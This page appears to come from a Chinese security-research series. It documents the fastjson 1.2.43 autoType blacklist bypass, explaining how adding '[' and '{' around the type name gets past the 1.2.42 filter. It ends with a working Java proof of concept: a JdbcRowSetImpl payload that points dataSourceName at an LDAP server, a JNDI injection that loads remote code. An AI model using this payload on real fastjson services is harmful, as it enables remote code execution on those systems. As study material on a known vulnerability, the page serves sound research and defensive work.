.. _1.2.43:

版本1.2.43
=============

漏洞说明
-----------

:ref:`1.2.42` 版本的POC到1.2.43版本不在适用，对连续两个\"L\"的情况做了过滤，通过在输入类型名称前加\"[\"表示数组类型，可以跳过\"LL\"的黑名单逻辑，但通过最后的调试信息显示在类型名称后面缺少\"[\"和\"{\"，追加后实现类型判断绕过。

调试
-------

.. figure:: images/1.2.43/ParserConfig-checkAutoType43-1.png

   ParserConfig.checkAutoType

   对于类型名称的前后增加了一次\"L\"和\";\"的判断，过滤了 :ref:`1.2.42` 版本的POC。

.. figure:: images/1.2.43/fastjson1.2.43-error1.png

   RunError

   当在类名前加\"[\"后，执行结果提示缺失\"[\"，在相应位置增加

.. figure:: images/1.2.43/fastjson1.2.43-error2.png

   RunError2

   提示缺失\"{\"，再次增加，运行成功。

POC
-------

.. code-block:: java

   package org.example;

   import com.alibaba.fastjson.JSON;
   import com.alibaba.fastjson.parser.ParserConfig;
   
   public class Main {
       public static void main(String[] args) {
   
           String s = "{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{,\"dataSourceName\":\"ldap://192.168.0.102:1389/ExTest\", \"autoCommit\":true}";
           ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
           Object contentValue = JSON.parseObject(s);
       }
   }
